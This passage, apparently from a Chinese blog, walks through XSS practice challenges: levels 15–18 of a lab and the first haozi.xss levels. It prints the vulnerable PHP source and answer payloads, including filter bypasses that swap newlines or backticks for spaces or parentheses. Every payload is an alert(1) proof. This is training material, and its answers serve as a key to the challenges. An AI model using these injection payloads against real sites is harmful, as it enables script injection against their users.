&lt;p&gt;源代码：&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;6&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;7&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;8&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;9&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;10&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;11&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;12&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;13&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;14&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;15&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;16&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;17&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;18&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;19&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;20&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;html ng-app&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;head&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;        &lt;meta charset&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;utf-8&quot;&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;        &lt;script src&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;angular.min.js&quot;&lt;&#x2F;span&gt;&gt;&lt;&#x2F;script&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;script&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;window.alert &#x3D; &lt;span class&#x3D;&quot;function&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;function&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;params&quot;&gt;&lt;&#x2F;span&gt;)  &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;function&quot;&gt;&lt;&#x2F;span&gt;&#123;     &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;confirm&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;完成的不错！&quot;&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt; window.location.href&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;level16.php?keyword&#x3D;test&quot;&lt;&#x2F;span&gt;; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&#125;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;&#x2F;script&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;title&gt;欢迎来到level15&lt;&#x2F;title&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;&#x2F;head&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;h1 align&#x3D;center&gt;欢迎来到第&lt;span class&#x3D;&quot;number&quot;&gt;15&lt;&#x2F;span&gt;关，自己想个办法走出去吧！&lt;&#x2F;h1&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;p align&#x3D;center&gt;&lt;img src&#x3D;level15.png&gt;&lt;&#x2F;p&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;ini_set&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;display_errors&quot;&lt;&#x2F;span&gt;, &lt;span class&#x3D;&quot;number&quot;&gt;0&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt; &#x3D; &lt;span class&#x3D;&quot;variable&quot;&gt;$_GET&lt;&#x2F;span&gt;[&lt;span class&#x3D;&quot;string&quot;&gt;&quot;src&quot;&lt;&#x2F;span&gt;];&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&lt;body&gt;&lt;span class&#x3D;&quot;ng-include:&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;htmlspecialchars&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;body&gt;&#x27;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Level 16&lt;&#x2F;p&gt;
&lt;p&gt;本题在&lt;center&gt;标签内，根据后面的&lt;img&gt;标签提示，我们可以构造一个img标签&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204141319824.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204141319824.png&quot; alt&#x3D;&quot;image-20240204141319824&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;经过尝试发现过滤了空格，我们可以用&lt;code&gt;%0A&lt;&#x2F;code&gt;换行符绕过空格&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;keyword&#x3D;&lt;img%0Asrc&#x3D;1%0Aonclick&#x3D;&quot;alert(1)&quot;&gt;&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;答案实际形式：&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight txt&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;keyword&#x3D;&lt;img&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;src&#x3D;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;onclick&#x3D;&quot;alert(1)&quot;&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;p&gt;源代码：&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;6&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;7&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;8&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;9&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;10&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;11&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;12&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;13&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;14&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;15&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;16&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;17&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;18&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;19&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;20&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;21&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;22&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;23&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;24&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;25&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;26&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;27&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;28&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;29&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;!DOCTYPE &lt;span class&#x3D;&quot;keyword&quot;&gt;html&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;comment&quot;&gt;&lt;!--STATUS OK--&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;html&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;head&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;meta&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;http-equiv&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;content-type&quot;&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;content&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;script&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;span class&#x3D;&quot;variable language_&quot;&gt;window&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;property&quot;&gt;alert&lt;&#x2F;span&gt; &#x3D; &lt;span class&#x3D;&quot;keyword&quot;&gt;function&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;params&quot;&gt;&lt;&#x2F;span&gt;)  &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&#123;     &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;span class&#x3D;&quot;title function_&quot;&gt;confirm&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;完成的不错！&quot;&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt; &lt;span class&#x3D;&quot;variable language_&quot;&gt;window&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;property&quot;&gt;location&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;property&quot;&gt;href&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;level17.php?arg01&#x3D;a&amp;arg02&#x3D;b&quot;&lt;&#x2F;span&gt;; &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&#125;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;script&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;title&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;欢迎来到level16&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;title&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;head&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;body&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;h1&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;align&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;center&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;欢迎来到level16&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;h1&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;ini_set(&quot;display_errors&quot;, 0);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;$str &#x3D; strtolower($_GET[&quot;keyword&quot;]);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;$str2&#x3D;str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;$str3&#x3D;str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;$str4&#x3D;str_replace(&quot;&#x2F;&quot;,&quot;&amp;nbsp;&quot;,$str3);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;$str5&#x3D;str_replace(&quot;	&quot;,&quot;&amp;nbsp;&quot;,$str4);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;&#x2F;center&gt;&quot;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;center&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;img&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;src&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;level16.png&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;center&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str5).&quot;&lt;&#x2F;h3&gt;&quot;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;body&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;html&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Level 17&lt;&#x2F;p&gt;
&lt;p&gt;查看网页源代码可知有两个参数arg01和arg02，进行尝试后发现会拼接在&lt;embed&gt;标签内，有src属性&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204142001519.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204142001519.png&quot; alt&#x3D;&quot;image-20240204142001519&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;可以构造以下payload&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204142237099.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204142237099.png&quot; alt&#x3D;&quot;image-20240204142237099&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;arg01&#x3D;a&amp;arg02&#x3D; onMouseOver&#x3D;alert(1)&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Level 18&lt;&#x2F;p&gt;
&lt;p&gt;本题与17题一致，payload相同&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id&#x3D;&quot;haozi-xss题解&quot;&gt;haozi.xss题解&lt;&#x2F;h3&gt;
&lt;p&gt;网址： &lt;a href&#x3D;&quot;https:&#x2F;&#x2F;xss.haozi.me&#x2F;&quot;&gt;https:&#x2F;&#x2F;xss.haozi.me&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;h4 id&#x3D;&quot;0x00&quot;&gt;0x00&lt;&#x2F;h4&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204143959934.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204143959934.png&quot; alt&#x3D;&quot;image-20240204143959934&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;h4 id&#x3D;&quot;0x01&quot;&gt;0x01&lt;&#x2F;h4&gt;
&lt;p&gt;注入点在&lt;textarea&gt;&lt;&#x2F;textarea&gt;标签中，故按照0x00的方法无法被解析，可提前闭合标签。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204144343303.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204144343303.png&quot; alt&#x3D;&quot;image-20240204144343303&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;&lt;&#x2F;textarea&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;也可以利用error事件：&lt;code&gt;&lt;&#x2F;textarea&gt;&lt;img src&#x3D;&quot;&quot; onerror&#x3D;alert(1)&gt;&lt;&#x2F;code&gt;，由于src是空，所以肯定会报错,，故通过错误调用事件成功注入&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;h4 id&#x3D;&quot;0x02&quot;&gt;0x02&lt;&#x2F;h4&gt;
&lt;p&gt;本题input标签内的value会将值转化为字符串，然后显示在输入框内，故前两题的标签闭合注入会失效，可以借鉴SQL注入的方法，将前面的双引号闭合，然后注入新的标签&lt;&#x2F;p&gt;
&lt;p&gt;答案：&lt;code&gt;&quot; &gt; &lt;script&gt;alert(1)&lt;&#x2F;script&gt;&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;也可以使用onclick事件：&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204144832842.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204144832842.png&quot; alt&#x3D;&quot;image-20240204144832842&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;&quot; onclick&#x3D;&quot;alert(1)&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;h4 id&#x3D;&quot;0x03&quot;&gt;0x03&lt;&#x2F;h4&gt;
&lt;p&gt;过滤符号：&lt;code&gt;() &lt;&gt;&lt;&#x2F;code&gt; ，在JavaScript中可以使用反引号&#96;&#96; &lt;code&gt;来代替&lt;&#x2F;code&gt;()&#96;&lt;&#x2F;p&gt;
